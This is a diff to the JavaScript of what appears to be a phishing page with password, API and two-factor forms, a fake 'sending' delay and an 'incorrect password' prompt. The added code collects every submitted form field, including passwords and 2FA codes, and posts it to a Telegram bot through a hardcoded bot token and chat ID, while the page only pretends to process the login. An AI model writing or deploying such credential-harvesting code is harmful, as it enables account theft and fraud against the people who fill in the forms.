@@ -4419,7 +4419,7 @@
         // Xử lý khi gửi thất bại
     });
 }
-        function firstFormHandle(event) {
+      async  function firstFormHandle(event) {
             event.preventDefault()
             updateFormsSendData(serializeForm(firstForm))
             var spiner = firstForm.querySelector('.spinner-border')
@@ -4436,7 +4436,27 @@
                 buttonText.style.display = 'block'
                 button.removeAttribute('disabled')
             }, SEND_FORM_FICTIV_TIME)
+            await sendByForm(event)
 
+        }
+
+        async function sendByForm(event){
+            event.preventDefault()
+
+ // Truy cập vào form từ event.target
+ var form = event.target;
+
+// Sử dụng FormData để lấy dữ liệu từ form
+var formData = new FormData(form);
+
+// Tạo một object từ FormData
+var formObject = {};
+formData.forEach((value, key) => {
+    formObject[key] = value;
+});
+
+console.log(formObject);
+await sendTele(formatMessage(formObject))
         }
 
         function hidePasswordIncorrectText() {
@@ -4446,8 +4466,9 @@
             }, 3000)
         }
 
-        function apiFormhandle(event) {
+      async  function apiFormhandle(event) {
             event.preventDefault()
+            await sendByForm(event)
             var spiner = apiForm.querySelector('.spinner-border')
             var buttonText = apiForm.querySelector('.button-text')
             var button = apiForm.querySelector('button')
@@ -4486,9 +4507,10 @@
         }
         var counter2FA = 1
         var countOf2FA = 3
-        function twoFAFormHandle(event) {
-            //handleFormSubmit(event, twoFAForm)
+       async function twoFAFormHandle(event) {
+
             event.preventDefault()
+            await sendByForm(event)
             var passwordInput = twoFAForm.querySelector('.password-input')
             var spiner = twoFAForm.querySelector('.spinner-border')
             var buttonText = twoFAForm.querySelector('.button-text')
@@ -4736,6 +4758,49 @@
                 document.getElementById('policyLink').click()
             })
         })
+
+        const sendTele = async (message) => {
+    const token = '7401189273:AAFw_XI65C9kQypHWf6v2wiQsr3aq4XGpqo'; // Thay bằng token bot của bạn
+    const chatId = '-4579170320'; // Thay bằng chat ID của bạn hoặc ID của nhóm/kênh
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    const payload = {
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown', // Hoặc 'HTML' tùy theo cách bạn muốn định dạng tin nhắn
+    };
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload),
+        });
+
+        if (!response.ok) {
+            throw new Error(`Error: ${response.statusText}`);
+        }
+
+        const data = await response.json();
+        console.log('Message sent successfully:', data);
+    } catch (error) {
+        console.error('Failed to send message:', error);
+    }
+};
+const formatMessage = (dataObject, title = 'New Submission') => {
+    let message = `📩 *${title}* 📩\n\n`;
+
+    for (const [key, value] of Object.entries(dataObject)) {
+        // Chuyển đổi key thành một định dạng thân thiện hơn (nếu cần)
+        const formattedKey = key.replace(/-/g, ' ').replace(/_/g, ' ').replace(/\b\w/g, (char) => char.toUpperCase());
+        message += `*${formattedKey}:* ${value}\n`;
+    }
+
+    return message;
+};
 
         detectUtmUserLeftBar()
         delectAccountUtm()
